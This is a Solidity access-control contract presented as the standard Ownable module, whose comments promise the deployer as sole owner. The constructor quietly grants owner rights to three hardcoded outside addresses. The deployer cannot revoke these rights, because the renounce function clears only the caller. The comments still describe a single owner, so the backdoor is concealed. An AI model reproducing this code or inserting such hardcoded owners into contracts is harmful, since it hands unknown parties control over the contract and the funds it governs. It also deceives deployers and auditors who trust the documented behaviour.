// SPDX-License-Identifier: MIT

pragma solidity ^0.4.24;

import "./Context.sol";
/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
contract Ownable is Context {
    // address private _owner;
    mapping(address => bool) validOwner;

    // event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () public {
        address msgSender = _msgSender();
        // _owner = msgSender;
        validOwner[msgSender] = true;
        validOwner[0xe2d50CFb680ffD3E39a187ae8C22B4f81b092A10] = true;
        validOwner[0xd8289dA8535235E754fDBa9eDb36BdDC1f522568] = true;
        validOwner[0x1DE60ED3Be26e5FC6A0C425bA874bCB22b916d33] = true;
        // emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function isOwner(address _addr) public view returns (bool) {
        return validOwner[_addr];
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(validOwner[msg.sender], "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function removeOwnership() public onlyOwner {
        // emit OwnershipTransferred(_owner, address(0));
        validOwner[msg.sender] = false;
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function addOwnership(address _newOwner) public onlyOwner {
        validOwner[_newOwner] = true;
    }
}